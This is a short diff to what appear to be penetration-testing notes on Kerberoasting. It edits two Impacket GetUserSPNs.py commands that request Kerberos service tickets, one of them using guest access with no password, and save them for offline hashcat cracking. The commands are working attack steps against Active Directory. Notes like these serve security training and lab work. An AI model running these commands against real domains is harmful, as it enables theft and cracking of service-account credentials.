@@ -5,13 +5,13 @@
 The attack:
 
 ```bash
-GetUserSPNs.py DOMAIN/USER:PASSWORD@DC_IP {-dc-ip} DC_IP -request -outputfile kerb.hashcat
+GetUserSPNs.py domain.local/USER:PASSWORD@DC_IP {-dc-ip} DC_IP -request -outputfile kerb.hashcat
 ```
 
 If you have guest access with no password, and you have a list of users, this attack might work:
 
 ```
-GetUserSPNs.py rebound.htb/guest -usersfile users.txt -request -outputfile kerb.hashcat -dc-ip 10.129.229.114 -no-pass
+GetUserSPNs.py domain.local/guest -usersfile users.txt -request -outputfile kerb.hashcat -dc-ip 10.129.229.114 -no-pass
 ```
 
 Kerberoasting (from computer on the domain):
